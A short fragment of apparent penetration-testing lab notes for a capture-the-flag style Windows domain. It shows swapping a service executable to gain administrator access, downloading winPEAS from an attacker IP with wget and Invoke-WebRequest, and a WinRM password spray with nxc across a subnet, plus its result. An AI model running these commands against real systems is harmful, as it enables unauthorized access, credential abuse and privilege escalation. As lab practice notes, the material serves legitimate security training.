...
#Transfer file
upload auditTracker.exe

# Move file to location
Move-Item -Force "C:\Users\wario\Documents\auditTracker.exe" "C:\DevelopmentExecutables\auditTracker.exe"
...
#Or net start auditTracker
# Grab Administrator Flag
```
![alt text](image-2.png)

------------
wget http://192.168.45.244:80/winPEASx64.exe

Invoke-WebRequest http://192.168.45.244:80/winPEASx64.exe -OutFile winPEASx64.exe

--------------
## Password spray with known passwords and users on various services
```bash
nxc winrm 172.16.160.0/24 -u users.txt -p Mushroom! -d medtech.com --continue-on-success 
# Results
WinRm:Wario:172.16.160.83
